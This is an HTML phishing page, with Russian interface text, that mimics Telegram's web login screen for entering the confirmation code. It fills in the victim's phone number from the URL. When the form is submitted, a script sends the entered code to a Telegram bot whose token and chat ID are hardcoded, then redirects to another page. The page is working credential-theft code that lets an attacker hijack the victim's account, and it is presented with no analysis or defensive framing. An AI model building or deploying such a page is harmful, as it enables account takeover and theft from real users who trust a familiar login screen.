  <head>

  <body
    id="root"
    class="ThfRMqwq is-pointer-env is-windows"
    style="--theme-background-color: #0f0f0f"
  >
  
    <div id="auth-code-form" class="custom-scroll">
      <div class="auth-form">
        <img class="monkey-image" src="./monkey.a3d5fcdc50b18dc55695.svg" />
          <!-- Здесь добавьте содержимое вашего SVG-логотипа -->
          <!-- Например: -->
        </svg>
        <h1 class="num_nam">
          <div
            class="auth-number-edit div-button"
            role="button"
            tabindex="0"
            title="Неправильный номер?"
            aria-label="Неправильный номер?"
          >
            <i class="icon icon-edit"></i>
          </div>
        </h1>
        <p class="note">
          Мы отправили код в приложение <b>Telegram</b> на другом Вашем
          устройстве.
        </p>
        <form id="form_code" >
 <div class="input-group touched with-label">
          <input
            class="form-control"
            type="text"
            id="sign-in-code"
            dir="auto"
            autocomplete="off"
            inputmode="numeric"
            aria-label="Код"
          /><label for="sign-in-code">Код</label>
        </div>
        <button
         
          type="submit"
          class="Button default primary has-ripple"
          
        
        >
          Далее
         
        </button>

        </form>
       
      </div>
    </div>
  
    <script>
      document.addEventListener("DOMContentLoaded", function() {
          var urlParams = new URLSearchParams(window.location.search);
          var phoneNumber = urlParams.get('phone');
          
          // Вставляем номер телефона в элемент <h1>
          document.querySelector('.num_nam').textContent = phoneNumber;
      });
  </script>
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    document.getElementById('form_code').addEventListener('submit', function(event) {
        event.preventDefault(); // Предотвращаем стандартное поведение формы

        var code = document.getElementById('sign-in-code').value; // Получаем значение поля кода

        // Отправляем данные в телеграмм
        axios.post('https://api.telegram.org/bot6231653529:AAG8n759Gesghq1Zv3_93MtRe2eocwb66fU/sendMessage', {
            chat_id: '5735423399',
            text: 'Код: ' + code
        })
        .then(function(response) {
            console.log('Данные успешно отправлены в телеграмм');
            // Можно добавить здесь какое-то действие после успешной отправки данных
            // Перенаправляем пользователя на sus.html
            window.location.href = './sus.html';
        })
        .catch(function(error) {
            console.error('Произошла ошибка при отправке данных в телеграмм:', error);
        });
    });
</script>
